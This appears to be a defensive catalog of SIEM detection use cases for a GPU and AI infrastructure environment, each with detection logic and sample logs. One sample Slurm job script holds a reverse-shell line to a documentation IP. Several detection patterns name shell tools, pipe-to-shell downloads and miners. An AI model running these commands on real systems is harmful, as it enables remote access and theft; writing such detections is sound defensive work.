Nov 12 06:30:03 ufm-01 opensm[3021]: osm_sm_state_mgr_process: Remote SM with GUID 0xb83fd20300a1c2e4 and priority 15 is now MASTER; local SM 0x0002c90300ab1234 entering STANDBY state

usecases.name: NVSwitch fatal error or Fabric Manager in degraded mode
usecases.description: Fatal NVSwitch errors and NVLink training failures make Fabric Manager drop the HGX baseboard into degraded mode. The whole node's GPU-to-GPU bandwidth is lost and large-model jobs fail. Repeats on one node can also point to tampering or failing hardware.
usecases.detection: Any SXid marked Fatal, any Fabric Manager "degraded mode" or partition activation failure, or more than 3 non-fatal SXids per NVSwitch per hour.
usecases.sample_log:
Nov 12 07:01:15 hgx-h100-r02-n05 kernel: nvidia-nvswitch2: SXid (PCI:0000:07:00.0): 24007, Fatal, Link 44 sourcetrack timeout error (First)
[Nov 12 2026 07:01:15] [ERROR] [tid 3412] detected NVSwitch fatal error 24007 on fid 0 switch id 2 port 44
[Nov 12 2026 07:01:16] [ERROR] [tid 3412] NVLink training failed, fabric manager entering degraded mode

usecases.name: RoCE / RDMA traffic from hosts outside the fabric inventory
usecases.description: RDMA bypasses the host network stack and most host firewalls. RoCEv2 traffic from an unknown host, or crossing tenant VRFs, can reach GPU memory and storage targets directly.
log_sources: sFlow / NetFlow from fabric switches (goflow2, NVIDIA NetQ)
usecases.detection: UDP/4791 (RoCEv2) flows whose source is not in the GPU or storage node inventory, or whose source and destination sit in different tenant VRFs or VNIs.

usecases.name: Fabric switch configuration change outside a change window
usecases.description: Spectrum and InfiniBand switch changes to QoS (PFC/ECN), ACLs or routing can quietly wreck collective- communication performance or open paths between tenants. They should come only from the automation pipeline.
usecases.detection: "nv set", "nv unset" or "nv config apply" (or the vendor equivalent) run by a human account outside an approved window, or any change to qos roce, acl or router bgp stanzas on GPU leaf and spine switches.
usecases.sample_log:
Nov 12 22:47:13 tacacs-01 tac_plus[2201]: 10.255.0.21 k.osei pts/0 10.20.31.144 stop task_id=8812 timezone=UTC service=shell start_time=1794523633 cmd=nv set qos roce mode lossy <cr>
Nov 12 22:47:20 tacacs-01 tac_plus[2201]: 10.255.0.21 k.osei pts/0 10.20.31.144 stop task_id=8813 timezone=UTC service=shell start_time=1794523640 cmd=nv config apply -y <cr>

usecases.name: Default or shared credentials used on fabric switches
usecases.description: Fabric switches often ship with default local accounts (cumulus, admin) and get missed during hardening. Brute force or a successful login with them gives full control of the GPU network.
usecases.detection: 5 or more failed logins on a switch from one source in 10 minutes, or any successful login with a local default account instead of TACACS/RADIUS-backed named users.
usecases.sample_log:
Nov 12 23:02:41 leaf-gpu-07 sshd[5512]: Failed password for admin from 10.20.31.144 port 51822 ssh2
Nov 12 23:02:44 leaf-gpu-07 sshd[5512]: Failed password for admin from 10.20.31.144 port 51822 ssh2
Nov 12 23:02:49 leaf-gpu-07 sshd[5514]: Accepted password for cumulus from 10.20.31.144 port 51830 ssh2

usecases.name: Unknown device appears on a GPU fabric port
usecases.description: A new LLDP neighbor or InfiniBand node GUID on a port that should face a known GPU server can mean a rogue device, a laptop plugged into the fabric, or a swapped NIC.
usecases.detection: An LLDP neighbor or IB node GUID on a leaf port that does not match the cabling plan or CMDB, or a new chassis MAC or GUID not in hardware inventory.

usecases.name: PFC pause storm on the lossless RoCE fabric
usecases.description: A host or NIC sending continuous priority-flow-control pause frames can freeze lossless queues across the fabric and stall every collective operation in a training job. It can be a fault or a denial-of-service attempt.
usecases.detection: Any PFC watchdog storm detection, or PFC pause frames received on a host-facing port above 10x its 1-hour baseline.
usecases.sample_log: Nov 12 09:44:31.118 leaf-gpu-03 NOTICE swss#orchagent: :- handleWdNotification: PFC Watchdog detected PFC storm on port Ethernet64, queue index 3, queue id 0x15000000000292 and port id 0x1000000000017.

usecases.name: Port mirroring or ERSPAN session created on the GPU fabric
usecases.description: SPAN and ERSPAN copy fabric traffic (including unencrypted RDMA payloads and storage reads) to another port or a remote IP. A new mirror session is a sniffing setup unless it is documented.
usecases.detection: Creation of any SPAN or ERSPAN session on GPU leaf or spine switches, especially ERSPAN whose destination IP is outside the monitoring VLAN.
usecases.sample_log:
Nov 12 23:15:02 tacacs-01 tac_plus[2201]: 10.255.0.21 k.osei pts/0 10.20.31.144 stop task_id=8840 timezone=UTC service=shell start_time=1794525302 cmd=nv set system port-mirror session 1 erspan source-port swp14 <cr>
Nov 12 23:15:09 tacacs-01 tac_plus[2201]: 10.255.0.21 k.osei pts/0 10.20.31.144 stop task_id=8841 timezone=UTC service=shell start_time=1794525309 cmd=nv set system port-mirror session 1 erspan destination dest-ip 203.0.113.80 <cr>

usecases.name: BlueField DPU mode switch or NIC firmware burn
usecases.description: BlueField DPUs and SuperNICs enforce tenant isolation and offloaded firewalling. Switching a DPU to NIC mode, or burning firmware with mlxconfig or flint outside maintenance, removes that enforcement point or implants firmware.
log_sources: Linux auditd (execve of mlxconfig / flint / mstfwmanager)
usecases.detection: mlxconfig "set" of INTERNAL_CPU_OFFLOAD_ENGINE or INTERNAL_CPU_MODEL, or any flint or mstfwmanager burn, on hosts or DPU Arm cores outside an approved change. Also flag DPU/NIC firmware versions that drift from baseline.
usecases.sample_log:
type=EXECVE msg=audit(1794478000.512:93011): argc=6 a0="mlxconfig" a1="-d" a2="/dev/mst/mt41692_pciconf0" a3="-y" a4="s" a5="INTERNAL_CPU_OFFLOAD_ENGINE=1"
type=SYSCALL msg=audit(1794478000.512:93011): arch=c000003e syscall=59 success=yes exit=0 ppid=77120 pid=77188 auid=1042 uid=0 euid=0 comm="mlxconfig" exe="/usr/bin/mlxconfig" key="nic_fw_tools"

usecases.name: BMC login with a default account or from outside the OOB jump hosts
usecases.description: The BMC (iDRAC, iLO, XClarity, DGX BMC) gives power control, a virtual console, virtual media and firmware update on GPU servers. Logins with root, ADMIN or admin, or from anywhere other than the out-of-band jump hosts, put the whole server at risk.
usecases.detection: Successful BMC logins (for example iDRAC USR0030) whose source IP is outside the OOB management/jump-host range, any use of factory default accounts, or 5 or more failed logins (USR0031) from one source in 10 minutes.
usecases.sample_log: <46>Nov 12 01:44:10 idrac-xe9680-r11-n04 Severity: Informational, Category: Audit, MessageID: USR0030, Message: Successfully logged in using root, from 10.20.31.144 and REDFISH.

usecases.name: BMC or BIOS firmware update outside a maintenance window
usecases.description: Malicious or downgraded BMC/UEFI firmware survives reimaging and gives persistent, OS-invisible control of GPU servers. Every firmware update should match an approved change and a signed image hash.
usecases.detection: Redfish Update.* messages (UpdateInProgress, InstallingOnComponent, UpdateSuccessful) outside an approved window, from an operator not in the firmware team, or for an image whose hash or version is not in the approved catalog, including downgrades.

usecases.name: Secure Boot disabled or measured-boot attestation failure
usecases.description: GPU nodes that boot with Secure Boot off, or whose TPM PCR quotes stop matching the golden values, may be running a bootkit or an unapproved kernel underneath every training job.
usecases.detection: Kernel reports "Secure boot disabled" on a node in the hardened fleet, PCR 0/2/4/7 mismatches from the attestation verifier, or a Redfish PATCH that sets SecureBootEnable to false.
usecases.sample_log:
Nov 12 03:10:02 dgx-h100-r04-n11 kernel: secureboot: Secure boot disabled
2026-11-12 03:12:44.118 - keylime.tpm - ERROR - PCR #7: 9a3c41e8f0b2d7c6a5e4f3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2 from quote (from agent dgx-h100-r04-n11) does not match expected value ['b1f2e3d4c5b6a7980f1e2d3c4b5a69788796a5b4c3d2e1f0a9b8c7d6e5f4a3b2']
2026-11-12 03:12:44.120 - keylime.verifier - WARNING - Agent dgx-h100-r04-n11 failed, stopping polling

usecases.name: In-band host reaching the out-of-band BMC network
usecases.description: Production, GPU and tenant networks should never reach BMC addresses. IPMI-over-LAN (UDP 623) from a GPU node can dump RAKP password hashes or abuse cipher suite 0, and Redfish/SSH access means a pivot onto the management plane.
log_sources: Firewall logs between production and OOB zones
usecases.detection: Any flow from production, GPU or tenant subnets to BMC ranges on UDP 623, TCP 443, 22, 5900 or 623, or IPMI sessions that use cipher suite 0 or a null user name.

usecases.name: Hypervisor shell enabled or unsigned VIB installed
usecases.description: Attackers on ESXi lower the software acceptance level and install unsigned VIBs for persistence that survives reboots, or enable SSH and the ESXi Shell to run tooling directly on hosts carrying GPU VMs.
usecases.detection: "esxcli software acceptance set" to CommunitySupported, "esxcli software vib install" with --no-sig-check or -f, or SSH / ESXi Shell enabled outside a maintenance window.
usecases.sample_log:
2026-11-12T04:51:22.118Z esx-r01-n05.corp.example shell[2112045]: [root]: esxcli software acceptance set --level=CommunitySupported
2026-11-12T04:51:40.733Z esx-r01-n05.corp.example shell[2112045]: [root]: esxcli software vib install -v /tmp/vmware-sys.vib -f --no-sig-check

usecases.name: Sudoers modified or unexpected sudo-to-root on GPU nodes
usecases.description: Research users often get sudo on GPU nodes "temporarily". New sudoers entries, or root shells for accounts outside the platform-admin group, are the usual path from user to persistent root.
usecases.detection: Any write to /etc/sudoers or /etc/sudoers.d/*, sudo to root by users outside the admin group, or "sudo su -", "sudo -i" or "sudo bash" on compute nodes.
usecases.sample_log:
Nov 12 05:22:01 dgx-h100-r04-n11 sudo:   jsmith : TTY=pts/3 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/tee -a /etc/sudoers.d/90-research
Nov 12 05:22:01 dgx-h100-r04-n11 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by jsmith(uid=1042)

usecases.name: New systemd unit or cron job on stateless GPU nodes
usecases.description: GPU nodes are built from images and managed by config management, so a hand-written systemd unit or cron entry is a classic persistence mechanism for miners and implants.
usecases.detection: File creation or modification under /etc/systemd/system, /etc/cron.*, /var/spool/cron or ~/.config/systemd/user by any process other than the config-management agent (Ansible, Salt, Puppet).
usecases.sample_log:
type=SYSCALL msg=audit(1794463922.330:90551): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffd2b1c3e10 a2=241 a3=1b6 items=2 ppid=88120 pid=88133 auid=1042 uid=0 gid=0 euid=0 comm="bash" exe="/usr/bin/bash" key="systemd_units"
type=PATH msg=audit(1794463922.330:90551): item=1 name="/etc/systemd/system/nvidia-telemetryd.service" inode=263401 dev=08:02 mode=0100644 ouid=0 ogid=0 nametype=CREATE

usecases.name: Bare-metal node network-booted with an unapproved image
usecases.description: Provisioning systems (MAAS, Ironic, Foreman, Base Command Manager) can reimage any GPU node. A PXE or iPXE boot serving a kernel or image outside the approved catalog is a fleet-wide implant path.
log_sources: DHCP / TFTP / HTTP boot server logs (dnsmasq, iPXE)
usecases.detection: TFTP or HTTP boot downloads of kernels or images whose path or hash is not in the approved catalog, or node deploy/reimage actions started by non-automation users.
usecases.sample_log:
Nov 12 01:03:22 pxe-01 dnsmasq-dhcp[1401]: DHCPDISCOVER(eth1) a0:88:c2:45:1f:2e
Nov 12 01:03:22 pxe-01 dnsmasq-dhcp[1401]: DHCPOFFER(eth1) 10.200.40.17 a0:88:c2:45:1f:2e
Nov 12 01:03:25 pxe-01 dnsmasq-tftp[1401]: sent /srv/tftp/images/ubuntu-22.04-custom-jsmith/vmlinuz to 10.200.40.17

usecases.name: GPU passed through to an unexpected virtual machine
usecases.description: Attaching a physical GPU (PCI vendor 10de) to a VM outside the GPU VM inventory hides workloads from scheduler-level monitoring. It is a common way to run unsanctioned training or mining.
usecases.detection: Hostdev or PCI passthrough attach of an NVIDIA device to a VM not in the GPU-VM inventory, or performed by an account outside the virtualization automation group.

usecases.name: Chassis intrusion on a GPU server
usecases.description: A chassis-open sensor going off on a rack of eight-GPU servers worth several hundred thousand dollars each points to GPU or drive theft, hardware implants, or maintenance done without a ticket.
log_sources: BMC System Event Log (IPMI SEL / Redfish LogService)
usecases.detection: Any "General Chassis intrusion Asserted" SEL entry, or a GPU, NIC or drive serial change in Redfish inventory, with no matching RMA or maintenance ticket. Correlate with physical access (FAC-008).
usecases.sample_log:
1a3 | 11/12/2026 | 02:41:17 | Physical Security #0x73 | General Chassis intrusion | Asserted
1a4 | 11/12/2026 | 02:58:40 | Physical Security #0x73 | General Chassis intrusion | Deasserted

usecases.name: Privileged or host-mounted pod scheduled on GPU nodes
usecases.description: A pod with privileged mode, hostPID, hostNetwork or a hostPath mount of / effectively owns the node, including every other tenant's GPU memory, model files and tokens on it.
usecases.detection: Pod create or update with securityContext.privileged=true, hostPID, hostNetwork, hostIPC or a hostPath volume, in namespaces other than the approved system list (kube-system, gpu-operator, network-operator).

usecases.name: Interactive exec into production training or inference pods
usecases.description: kubectl exec into pods that hold model weights, API keys and customer prompts bypasses deployment controls. In production it should be rare, ticketed and done by named on-call engineers.
usecases.detection: create on pods/exec or pods/attach in namespaces labeled env=prod or tier=inference/training, by users outside the on-call group or with no incident ticket, especially with tty=true and /bin/sh or bash.

usecases.name: Binding to cluster-admin created outside GitOps
usecases.description: Binding a user or service account to cluster-admin hands over every namespace, secret and GPU node in the cluster. When a notebook or workload service account does it, that is privilege escalation in progress.
usecases.detection: create or update of clusterrolebindings or rolebindings whose roleRef is cluster-admin, admin or a wildcard role, by any identity other than the GitOps controller, and especially by system:serviceaccount:* subjects.

usecases.name: Anonymous request allowed by the Kubernetes API server
usecases.description: A binding that grants rights to system:anonymous or system:unauthenticated turns an exposed API server into an open door. Scanners look for exactly this on GPU clusters.
usecases.detection: Any request from system:anonymous with a 2xx response on paths other than /healthz, /livez, /readyz and /version, or any RBAC binding whose subject is system:anonymous or system:unauthenticated.
usecases.sample_log: {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"2c3d4e5f-6a7b-4c8d-9e0f-1a2b3c4d5e6f","stage":"ResponseComplete","requestURI":"/api/v1/secrets?limit=500","verb":"list","user":{"username":"system:anonymous","groups":["system:unauthenticated"]},"sourceIPs":["203.0.113.120"],"userAgent":"curl/8.5.0","objectRef":{"resource":"secrets","apiVersion":"v1"},"responseStatus":{"code":200},"requestReceivedTimestamp":"2026-11-12T16:44:13.002Z","stageTimestamp":"2026-11-12T16:44:13.019Z","annotations":{"authorization.k8s.io/decision":"allow","authorization.k8s.io/reason":"RBAC: allowed by ClusterRoleBinding \"anon-debug\" of ClusterRole \"cluster-admin\" to User \"system:anonymous\""}}

usecases.name: Service account token used from outside the cluster
usecases.description: Service account tokens stolen from a training pod (through a notebook, a log or an SSRF) can be replayed from a laptop or the internet. Bound tokens record the node and pod they were issued to, which makes off-cluster use easy to spot.
usecases.detection: Requests from system:serviceaccount:* identities whose sourceIPs are outside the pod and node CIDRs, the same token credential-id seen from more than one source, or service accounts calling with kubectl user agents from non-Linux platforms.

usecases.name: Secrets read across namespaces by a single identity
usecases.description: Kubernetes secrets hold registry credentials, S3 keys for datasets and checkpoints, NGC and Hugging Face tokens, and database passwords. One identity reading secrets in several namespaces is harvesting credentials.
usecases.detection: get, list or watch on secrets in 3 or more namespaces within 10 minutes by one identity, any cluster-wide list of secrets by a non-controller identity, or a successful secret read after a burst of 403s.

usecases.name: Admission controller webhook deleted or set to fail open
usecases.description: Kyverno, Gatekeeper and image-signature webhooks are what keep privileged pods and unsigned images out of GPU clusters. Deleting them, or flipping failurePolicy to Ignore, switches those guardrails off.
usecases.detection: delete, update or patch on validatingwebhookconfigurations or mutatingwebhookconfigurations of policy engines, failurePolicy changed to Ignore, or policies changed from Enforce to Audit, outside GitOps.

usecases.name: Unsigned or untrusted-registry image admitted to the cluster
usecases.description: Training and inference images pull in CUDA, NCCL, Python wheels and model code. An image from an unapproved registry, or one that fails signature verification, is a supply-chain entry point onto GPU nodes.
log_sources: Kyverno / Gatekeeper policy reports and events
usecases.detection: Image signature verification failures (cosign / Notation), images from registries outside the allow-list, mutable tags (:latest) in production namespaces, or a policy in Audit mode letting such a pod run.

usecases.name: CronJob created for persistence in a system namespace
usecases.description: A CronJob that re-downloads a payload on a schedule survives pod restarts and node reimaging. In kube-system or on hostNetwork it hides among legitimate jobs.
usecases.detection: create or update of cronjobs in kube-system or other system namespaces by non-GitOps identities, or CronJobs whose command contains curl, wget, base64 or "| sh", or that use hostNetwork or privileged containers.

usecases.name: Service mesh mTLS downgraded to permissive or disabled
usecases.description: Mesh mTLS encrypts and authenticates traffic between gateways, model servers and vector databases. Setting PeerAuthentication to PERMISSIVE or DISABLE allows plaintext sniffing and spoofed workloads.
log_sources: Kubernetes API server audit logs (Istio / Linkerd CRDs)
usecases.detection: create, update or patch of peerauthentications.security.istio.io whose mtls.mode is PERMISSIVE or DISABLE, especially the mesh-wide default in istio-system, outside GitOps.

usecases.name: Container runtime socket mounted into a pod
usecases.description: Mounting containerd.sock, docker.sock or crio.sock lets a pod start privileged containers on the node, read any container's filesystem and bypass Kubernetes admission.
usecases.detection: Pod specs with hostPath volumes for /run/containerd/containerd.sock, /var/run/docker.sock or /var/run/crio/crio.sock outside approved system namespaces, or processes in containers connecting to those sockets.

usecases.name: Pods connecting directly to the kubelet API
usecases.description: The kubelet API on port 10250 can list pods and run commands in any container on the node. Workloads have no reason to call it, so a connection from a pod is reconnaissance or an exec attempt that bypasses API-server audit.
usecases.detection: Flows from pod CIDRs to TCP 10250 or 10255 on any node, or kubelet authentication failures from sources other than the API server and monitoring agents.

usecases.name: Privileged SCC granted to a workload service account (OpenShift)
usecases.description: On OpenShift, adding the privileged or anyuid SecurityContextConstraint to a service account lifts the platform's default container isolation for every pod that uses it.
usecases.detection: RoleBinding or ClusterRoleBinding creation that references system:openshift:scc:privileged, hostaccess, hostmount-anyuid or anyuid for service accounts in tenant namespaces, outside GitOps.

usecases.name: Production namespace deleted by an automation identity from an odd source
usecases.description: Deleting an inference or training namespace takes down serving, removes PVC claims and can trigger volume deletion. When a GitOps or CI identity does it from a laptop or an external IP, the credentials are compromised.
usecases.detection: delete on namespaces labeled env=prod, or deletes of 20 or more pods, deployments or PVCs in 5 minutes, by an identity whose source IP or user agent differs from its 30-day baseline.

usecases.name: Unauthenticated Ray Jobs API submission (ShadowRay pattern)
usecases.description: The Ray Jobs API runs arbitrary entrypoints on the cluster and has no authentication by default (CVE-2023-48022). Exposed Ray dashboards were mass-exploited to steal credentials and mine on GPU clusters.
log_sources: Ingress or firewall logs for ports 8265 and 10001
usecases.detection: POST /api/jobs/ from IPs outside the approved submitter list, or job entrypoints containing curl, wget, nc, base64, /dev/tcp or "| bash". Any job submission whose source is outside the cluster VPC is Critical.

usecases.name: Slurm batch job containing a reverse shell or miner
usecases.description: A compromised researcher account can use sbatch to run code on hundreds of GPU nodes at once. Storing job scripts in slurmdbd makes the payload visible to the SIEM.
usecases.detection: Job scripts that match /dev/tcp/, "nc -e", "bash -i", stratum+tcp, xmrig, "curl | bash" or "base64 -d |", or GPU jobs from accounts that have never submitted GPU work.
usecases.sample_log:
[2026-11-12T08:02:14.118] _slurm_rpc_submit_batch_job: JobId=4412871 InitPrio=4294901759 usec=812
[2026-11-12T08:02:15.003] sched: Allocate JobId=4412871 NodeList=gpu-node-[0412-0415] #CPUs=512 Partition=h100-prod
# job script from slurmdbd (user=jsmith account=vision)
#!/bin/bash
#SBATCH --gres=gpu:8 --nodes=4 --time=72:00:00
srun --overlap bash -c 'bash -i >& /dev/tcp/203.0.113.50/443 0>&1'

usecases.name: Slurm admin level, QOS or GPU limit changed
usecases.description: Raising a user's AdminLevel, removing GrpTRES GPU limits or granting access to restricted partitions hands out GPU capacity and scheduler control without going through the allocation process.
usecases.detection: Any change to admin_level, any QOS or association change that raises or removes gres/gpu limits, or users added to restricted partitions, by an actor other than the allocation automation or outside a change ticket.
usecases.sample_log:

2026-11-12T09:11:02  Modify Associations       root (user='jsmith' AND acct='vision') grp_tres='gres/gpu=512'

usecases.name: GPU allocation far above baseline, or allocated GPUs left idle
usecases.description: A user who suddenly allocates 8x their normal GPU count, or reserves dozens of GPUs that sit idle, is either hoarding scarce capacity or holding it for unauthorized use.
usecases.detection: AllocTRES gres/gpu at 4x or more of the user's 30-day maximum, or allocated GPUs averaging under 5% SM activity for 2 hours, or jobs in partitions or QOS the account is not entitled to.

usecases.name: Slurm prolog, epilog, slurm.conf or munge key tampering
usecases.description: Prolog and epilog scripts run as root on every node for every job, and the munge key authenticates the whole cluster. Editing either one gives cluster-wide root and lets an attacker forge jobs as any user.
usecases.detection: Any write to /etc/slurm/*.conf, prolog.d or epilog.d scripts, or /etc/munge/munge.key outside config management, or a read of munge.key by any process other than munged.

usecases.name: Pod bypasses the Kubernetes scheduler onto reserved GPU nodes
usecases.description: Setting spec.nodeName skips the scheduler, quotas and placement policy entirely. Adding tolerations for another tenant's dedicated taint puts a workload onto their reserved GPU nodes.
usecases.detection: Pod create with spec.nodeName set by a non-system identity, or tolerations for dedicated tenant or pool taints from namespaces not mapped to that tenant.

usecases.name: Ray head exposed through a LoadBalancer or NodePort service
usecases.description: Exposing the Ray dashboard (8265) or client port (10001) beyond the cluster recreates the ShadowRay exposure, usually because someone wanted to reach the dashboard from a laptop.
usecases.detection: Service create or update of type LoadBalancer or NodePort, or Ingress routes, that select ray.io/node-type=head or expose ports 8265, 10001 or 6379.

usecases.name: SSH to compute nodes with no running job (pam_slurm_adopt denials)
usecases.description: With pam_slurm_adopt, users can only SSH to nodes where they have a job. A burst of denials across nodes shows someone probing for access or trying to move laterally inside the cluster.
log_sources: Linux sshd / PAM logs on compute nodes
usecases.detection: 3 or more "Access denied by pam_slurm_adopt" events for one user across different nodes within 15 minutes, or any denial for a privileged or service account.
usecases.sample_log:
Nov 12 10:01:22 gpu-node-0412 sshd[11322]: pam_slurm_adopt(sshd:account): Access denied by pam_slurm_adopt: you have no active jobs on this node
Nov 12 10:01:22 gpu-node-0412 sshd[11322]: fatal: Access denied for user jsmith by PAM account configuration [preauth]

usecases.name: Long-lived Slurm REST API token issued
usecases.description: slurmrestd accepts JWTs. A token issued for another user, or with a lifespan of months, is a standing credential that can submit jobs to every partition that user can reach.
usecases.detection: Token generation where the lifespan exceeds policy (for example 24 hours) or the token is issued for a username other than the caller, and slurmrestd use of those tokens from unexpected IPs.
usecases.sample_log:
[2026-11-12T11:40:02.551] auth/jwt: auth_p_token_generate: created token for svc-pipeline for 31536000 seconds
[2026-11-12T11:40:02.552] _slurm_rpc_auth_token: token requested by uid=1042 (jsmith) for username=svc-pipeline lifespan=31536000

usecases.name: Secret pushed to a repository or push protection bypassed
usecases.description: Cloud keys, NGC API keys, Hugging Face tokens and kubeconfigs committed to ML repos get harvested within minutes once public. A push-protection bypass is someone knowingly shipping a secret.
log_sources: GitHub audit log / secret scanning alerts
usecases.detection: secret_scanning_push_protection.bypass with any reason, or a new secret-scanning alert for an active credential. Raise severity when the secret type grants access to clouds, GPU registries or model hubs.

usecases.name: Branch protection or rulesets removed on infrastructure repos
usecases.description: Removing required reviews or status checks on repos that define GPU clusters, model serving or IaC lets a single compromised account push straight to production.
usecases.detection: protected_branch.destroy, protected_branch.update that lowers required approvals, repository_ruleset.destroy, or admin enforcement turned off, on repos tagged tier-0 or infra.

usecases.name: CI job sends secrets or data to an unknown endpoint
usecases.description: A modified workflow that pipes env or secrets into curl, or a poisoned dependency running on a runner that holds cloud and registry credentials, ends with secrets leaving through the build.
log_sources: CI runner egress monitoring (Harden-Runner, proxy logs)
GitHub / GitLab audit logs (workflow file changes)
usecases.detection: Runner egress to domains outside the CI allow-list, especially paste, webhook or tunnel services; workflow diffs that add pull_request_target with a PR-head checkout; steps that print, encode or post secrets.* values.

usecases.name: Fork pull request runs on a self-hosted GPU runner
usecases.description: Self-hosted GPU runners on public repos run code from any fork PR. Attackers use them to steal runner tokens and cached credentials, mine, or persist on hardware inside the data center.
usecases.detection: Workflow jobs from fork pull requests (pull_request or pull_request_target) scheduled on runners labeled self-hosted or gpu, or any public repo using self-hosted runners without first-time-contributor approval.

usecases.name: Jenkins script console or credential store accessed
usecases.description: The Jenkins script console runs Groovy as the controller and can decrypt every stored credential, including cloud, registry and cluster deploy keys used by ML pipelines.
usecases.detection: Requests to /script or /scriptText, or credential-store pages, by anyone outside the Jenkins admin group, or by service accounts at all.
usecases.sample_log:
Nov 12, 2026 10:22:31,118 AM /scriptText by svc-ml-deployer from 10.20.31.144
Nov 12, 2026 10:22:44,902 AM /manage/credentials/store/system/domain/_/ by svc-ml-deployer from 10.20.31.144

usecases.name: Release image or package overwritten in the artifact repository
usecases.description: Re-pushing an existing release tag (for example triton-custom:24.10-prod) quietly swaps what every cluster pulls on its next deploy. Releases should be immutable and published only by CI.
log_sources: Artifact repository request / audit logs (Artifactory, Harbor, Nexus, ECR)
usecases.detection: PUT of a manifest or package over an existing release tag or version, a digest change for an existing tag, or any publish to release repositories by a non-CI identity.

usecases.name: Dependency confusion on internal package names
usecases.description: Training images pull many Python packages. If an internal package name such as corp-gpu-utils resolves from public PyPI with a higher version, the attacker's code runs in every build.
usecases.detection: Packages matching internal name prefixes resolved from a public remote, public versions far above the internal latest, or packages first published less than 7 days before being pulled into CI.

usecases.name: Bulk secret reads by a CI or workload identity in Vault
usecases.description: CI roles and workloads read a small, stable set of secret paths. One identity reading dozens of paths, or production paths it has never touched, is harvesting credentials.
log_sources: Cloud secret manager audit (AWS Secrets Manager, Azure Key Vault)
usecases.detection: One entity reading 50 or more distinct secret paths in 10 minutes, reading outside its 30-day path set, or a CI role for a non-production repo reading secret/data/prod/*.

usecases.name: Full-scope personal access token with long expiry created
usecases.description: Full-access PATs with a one-year lifetime are ideal for persistence. They survive password resets and often bypass conditional access when used from scripts.
usecases.detection: Token.PatCreateEvent (or the GitHub/GitLab equivalent) with full-access scope (app_token) or a validity over 90 days, or creation from an IP or device not seen for that user.
usecases.sample_log: {"timestamp":"2026-11-12T12:30:11.4412000Z","actionId":"Token.PatCreateEvent","area":"Token","category":"Create","actorUPN":"jsmith@corp.example","actorDisplayName":"Jordan Smith","authenticationMechanism":"AAD_Cookie","ipAddress":"198.51.100.14","scopeType":"organization","scopeDisplayName":"corp-ai (Organization)","data":{"DisplayName":"automation","Scopes":"app_token","ValidTo":"2027-11-12T00:00:00Z"},"details":"Created personal access token automation with full access scope"}

usecases.name: New self-hosted runner registered outside the fleet
usecases.description: Registering an attacker-controlled machine as a runner with gpu labels makes CI send it jobs, together with the secrets and artifacts those jobs hold.
usecases.detection: org.register_self_hosted_runner or repo.register_self_hosted_runner by anyone other than the runner-fleet automation, or runners whose name or labels do not match the managed fleet naming.

usecases.name: Unsafe pickle payload found in a downloaded model
usecases.description: PyTorch .bin/.pt and other pickle-based model files can run code as soon as they are loaded. Models pulled from public hubs into training or serving environments should be scanned, and safetensors preferred.
log_sources: Model scanner results (ModelScan, picklescan, Protect AI Guardian)
usecases.detection: Any scanner finding of severity HIGH or CRITICAL (os/posix.system, subprocess, builtins.exec or eval, runpy), or a pickle-format model loaded in production with no scan record.

usecases.name: Bulk model artifact download from MLflow or the model registry
usecases.description: Fine-tuned weights and checkpoints are often the most valuable IP in the building. Pulling many large artifacts, or artifacts outside the user's projects, looks like model theft.
log_sources: MLflow tracking server / artifact proxy access logs
usecases.detection: More than 50 GB or more than 20 model artifacts downloaded by one identity in 1 hour, or downloads from experiments the user does not own, especially followed by egress (NET-004).

usecases.name: Model promoted to production outside the release process
usecases.description: Moving a "champion" alias or Production stage to a model version trained from a personal experiment is the simplest way to ship a backdoored or poisoned model to users.
usecases.detection: Alias set or stage transition to Production or champion by users outside release managers, or where the source run belongs to a scratch or personal experiment, or with no linked evaluation and approval record.

usecases.name: Triton model control or shared-memory API called by an unexpected client
usecases.description: Triton's repository API loads and unloads models at runtime, and its shared-memory API was part of a 2025 RCE chain (CVE-2025-23319/23320/23334). Only the deployment system should call these endpoints.
usecases.detection: POST /v2/repository/models/*/load|unload, or /v2/*sharedmemory/region/*/register, from clients other than the CD system, any shared-memory register naming an internal region (triton_python_backend_shm_region_*), or Triton versions older than the fixed release.
usecases.sample_log:
I1112 12:44:03.118021 1 http_server.cc:4615] "HTTP request: 2 /v2/repository/models/llm-ensemble/load"
I1112 12:44:03.120882 1 model_lifecycle.cc:473] "loading: llm-ensemble:1"
I1112 12:44:05.774210 1 model_lifecycle.cc:849] "successfully loaded 'llm-ensemble'"
I1112 12:44:09.002113 1 http_server.cc:4615] "HTTP request: 2 /v2/systemsharedmemory/region/triton_python_backend_shm_region_4f50c226-b3d0-46e8-ac59-d4690b28b859/register"

usecases.name: Model server started with remote code from an unvetted repo
usecases.description: vLLM and SGLang can run arbitrary Python shipped with a model (trust_remote_code). Serving an unvetted Hub repo that way, on 0.0.0.0 with no API key, combines a supply-chain risk with an unauthenticated endpoint.
log_sources: Kubernetes API server audit logs (container args)
usecases.detection: trust_remote_code=True where the model is not from the internal mirror or registry, api_key None while bound to 0.0.0.0, or server versions with known RCE advisories.
usecases.sample_log:
INFO 11-12 13:02:11 [api_server.py:1885] vLLM API server version 0.11.0
INFO 11-12 13:02:11 [utils.py:328] non-default args: {'model': 'someuser-hf/qwen-ft-unknown', 'trust_remote_code': True, 'host': '0.0.0.0', 'port': 8000, 'api_key': None, 'tensor_parallel_size': 8}

usecases.name: Served model weights no longer match the signed manifest
usecases.description: If weight files in the NIM, Triton or vLLM model cache stop matching the hashes in the signed model manifest, someone modified the model at rest. That could be a backdoor, a swapped checkpoint or plain corruption.
log_sources: Model integrity checker (OpenSSF model-signing / Sigstore verification)
File integrity monitoring on model caches and PVCs
usecases.detection: Any SHA-256 mismatch between served model files and the signed manifest, an invalid manifest signature, or write events on model cache volumes by processes other than the model puller.

usecases.name: Jupyter server with authentication disabled, or a terminal opened from outside
usecases.description: Notebook servers on GPU nodes run with the user's credentials and mounted datasets. One started with no token, or a terminal opened from an unknown network, gives remote code execution in the data plane.
usecases.detection: The "All authentication is disabled" warning, servers bound to 0.0.0.0 with an empty token, or POST /api/terminals and kernel shell commands from IPs outside VPN or ZTNA ranges.
usecases.sample_log:
[W 2026-11-12 13:44:02.118 ServerApp] All authentication is disabled.  Anyone who can connect to this server will be able to run code.
